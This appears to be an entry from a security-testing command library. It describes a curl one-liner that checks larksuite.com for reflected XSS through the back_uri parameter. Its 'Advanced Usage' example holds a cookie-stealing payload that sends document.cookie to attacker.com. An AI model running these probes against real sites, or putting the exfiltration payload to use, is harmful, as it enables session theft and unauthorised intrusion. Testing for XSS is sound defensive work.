---
data: >-
  curl "https://larksuite.com/?back_uri=javascript:alert(1)" | grep -i
  "javascript:alert(1)"
tags:
  - web-testing
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.514Z'
id: 2b32b343-0b8a-4be5-8401-a126e9a64298
verified: false
validated: true
submitted: true
---
# curl-test-back_uri-xss

## Command

```bash
curl "https://larksuite.com/?back_uri=javascript:alert(1)" | grep -i "javascript:alert(1)"
```

## Description

This command fetches the page with a JavaScript payload in the back_uri parameter and greps for it in the response to check for unescaped reflection, indicating XSS vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--back_uri` | Payload value (e.g., javascript:alert(1)) | Yes |
| `grep -i` | Case-insensitive search for payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://larksuite.com/?back_uri=javascript:alert(1)" | grep -i "javascript:alert(1)"
```

### Advanced Usage

```bash
curl "https://larksuite.com/?back_uri=javascript:fetch('https://attacker.com?'+document.cookie)" | grep -o "javascript:fetch"
```

## Expected Output

javascript:alert(1)

If the payload appears unencoded, the site is vulnerable to XSS.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-back_uri]]
